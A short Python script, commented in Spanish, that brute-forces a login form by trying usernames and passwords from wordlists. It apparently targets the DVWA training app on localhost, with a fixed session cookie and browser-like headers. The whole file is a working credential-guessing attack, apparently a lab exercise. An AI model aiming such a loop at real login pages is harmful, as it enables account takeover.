import requests

# Variables a utilizar en el ataque
url = "http://localhost:4280/vulnerabilities/brute/"
userlist = "users.txt"
passwordlist = "http_default_passwords.txt"
grep = 'Username and/or password incorrect.'

# Campos que irán dentro de la cabecera HTTP
cookies = {
    'security': 'low',
    'PHPSESSID': '726eb737c3bbb94b95e7d106e8a06467',
}

headers = {
    'User-Agent': '(from Python) Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'http://localhost:4280/vulnerabilities/brute/',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'no-cache'
}

# Función de fuerza bruta
def brute_force(username, url):
    # Abre el archivo de contraseñas para probar cada una
    with open(passwordlist, 'r') as passwords:
        for password in passwords:
            password = password.strip()

            print('  Probando: ' + username + ' / ' + password)
            response = requests.get(url, headers=headers, cookies=cookies, params={'username': username, 'password': password, 'Login': 'Login'})

            # Verifica si el inicio de sesión falló
            if grep in response.content.decode():
                continue
            else:
                print(f"\033[92m    Coincidencia encontrada: {username} / {password}\033[0m")
                return True

    return False  # No se encontró ninguna combinación válida para este usuario

# Bucle principal que itera sobre los usuarios
with open(userlist, 'r') as users:
    for username in users:
        username = username.strip()
        print('=============================================')
        print('Intentando usuario: ' + username)

        if not brute_force(username, url):
            print(f"\033[91mNo hay coincidencias para {username}\033[0m")

print('\n Probadas todas las combinaciones.')
